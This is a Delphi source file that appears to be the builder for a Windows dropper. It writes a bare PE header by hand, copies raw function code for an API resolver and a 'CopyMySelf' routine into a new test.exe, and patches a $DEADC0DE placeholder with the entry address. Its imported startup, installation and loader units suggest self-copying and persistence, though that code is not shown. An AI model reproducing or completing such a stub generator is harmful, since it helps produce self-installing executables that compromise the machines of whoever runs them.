program Project1;

uses
  Windows,
  untStartUp in 'Functions\untStartUp.pas',
  untUtils in 'untUtils.pas',
  untInstallation in 'Functions\untInstallation.pas',
  untLoader in 'Loader\untLoader.pas',
  Sysutils,
  Classes;
  
var
  mFile:TMemoryStream;

procedure CreatePEBase();
var
  IDH:  TImageDosHeader;
  INH:  TImageNtHeaders;
  ISH:  TImageSectionHeader;
  pBuff:  Pointer;
  dwSpace:  DWORD;
  dwSize:Cardinal;
const
  szText:   string = '.text';
begin
  dwSize := 0;

  FillChar(IDH, 64, $0);
  IDH.e_magic := IMAGE_DOS_SIGNATURE;
  IDH._lfanew := $40;

  FillChar(INH, 248, $0);
  INH.Signature := IMAGE_NT_SIGNATURE;
  INH.FileHeader.Machine := $014C;
  INH.FileHeader.NumberOfSections := 1;
  INH.FileHeader.SizeOfOptionalHeader := $E0;
  INH.FileHeader.Characteristics := $010F;

  INH.OptionalHeader.Magic := $010B;
  INH.OptionalHeader.MajorLinkerVersion := 1;
  INH.OptionalHeader.MinorLinkerVersion := 2;
  INH.OptionalHeader.SizeOfCode := $200;
  INH.OptionalHeader.SizeOfInitializedData := $200;
  INH.OptionalHeader.AddressOfEntryPoint := $1000;
  INH.OptionalHeader.BaseOfCode := $1000;
  INH.OptionalHeader.BaseOfData := $1000;
  INH.OptionalHeader.ImageBase := $00400000;
  INH.OptionalHeader.SectionAlignment := $1000;
  INH.OptionalHeader.FileAlignment := $200;
  INH.OptionalHeader.SizeOfImage := $2000;
  INH.OptionalHeader.SizeOfHeaders := $200;
  INH.OptionalHeader.Subsystem := 2;
  INH.OptionalHeader.SizeOfStackReserve := $100000;
  INH.OptionalHeader.SizeOfStackCommit := $4000;
  INH.OptionalHeader.SizeOfHeapReserve := $100000;
  INH.OptionalHeader.SizeOfHeapCommit := $1000;
  INH.OptionalHeader.NumberOfRvaAndSizes := $10;
  INH.OptionalHeader.MajorSubsystemVersion := 4;
  INH.OptionalHeader.MajorOperatingSystemVersion := 4;

  FillChar(ISH, 40, $0);
  CopyMemory(@ISH.Name[0], @szText[1], Length(szText));
  ISH.PointerToRawData := $200;
  ISH.SizeOfRawData := dwSize;//
  ISH.VirtualAddress := $1000;
  ISH.Misc.VirtualSize := $1000;
  ISH.Characteristics := $60000060;

  mFile.WriteBuffer(IDH, 64);

  mFile.Seek($40, soBeginning);
  mFile.WriteBuffer(INH, 248);

  mFile.Seek($40 + 248, soBeginning);
  mFile.WriteBuffer(ISH, 40);

  dwSpace := $200 - (64 + 248 + 40);
  GetMem(pBuff, dwSpace);
  mFile.Seek(0, soEnd);
  mFile.WriteBuffer(pBuff^, dwSpace);
  FreeMem(pBuff);
end;

procedure CustomizeLoader(pFunc:DWORD);
var
  i:Integer;
  lResLen:Cardinal;
begin
  mFile.Seek(0, soBeginning);
  lResLen := pFunc + $00401000;
  for i := 0 to mFile.Size - 1 do
  begin
    if (PDWORD(Pointer(DWORD(mFile.Memory) + i))^ = $DEADC0DE) then
    begin
      mFile.Seek(i, soBeginning);
      mFile.WriteBuffer(lResLen, SizeOf(DWORD));
      break;
    end;
  end;
end;

procedure AddFunction(pFunc:Pointer; dwSize:Cardinal);
var
  pBuff:Pointer;
begin
  GetMem(pBuff, dwSize);
  ZeroMemory(pBuff, dwSize);
  CopyMemory(pBuff, pFunc, dwSize);
  mFile.Seek(0, soEnd);
  mFile.WriteBuffer(pBuff^, dwSize);
  FreeMem(pBuff);
end;

procedure FixSectionLen(dwFullLen:Integer);
var
  ISH:  TImageSectionHeader;
const
  szText:   string = '.text';
begin
  FillChar(ISH, 40, $0);
  CopyMemory(@ISH.Name[0], @szText[1], Length(szText));
  ISH.PointerToRawData := $200;
  ISH.SizeOfRawData := dwFullLen;//
  ISH.VirtualAddress := $1000;
  ISH.Misc.VirtualSize := $1000;
  ISH.Characteristics := $60000060;
  mFile.Seek($40 + 248, soBeginning);
  mFile.WriteBuffer(ISH, 40);
end;

procedure BuildSetup();
var
  dwSizeAll:DWORD;
  dwSize: DWORD;
begin
  mFile := TMemoryStream.Create;
  dwSizeAll := 0;
  
  CreatePEBase();

  dwSize := DWORD(@resolver_end) - DWORD(@resolver_start);
  dwSizeAll := dwSizeAll + dwSize;
  AddFunction(@resolver_start, dwSize);

  CustomizeLoader(dwSizeAll);

  dwSize := DWORD(@CopyMySelf_END) - DWORD(@CopyMySelf_CALLER);
  dwSizeAll := dwSizeAll + dwSize;
  AddFunction(@CopyMySelf_CALLER, dwSize);

  FixSectionLen(dwSizeAll);
  mFile.Position := 0;
  mFile.SaveToFile('test.exe');
  mFile.Free;
end;

begin
   BuildSetup;
end.
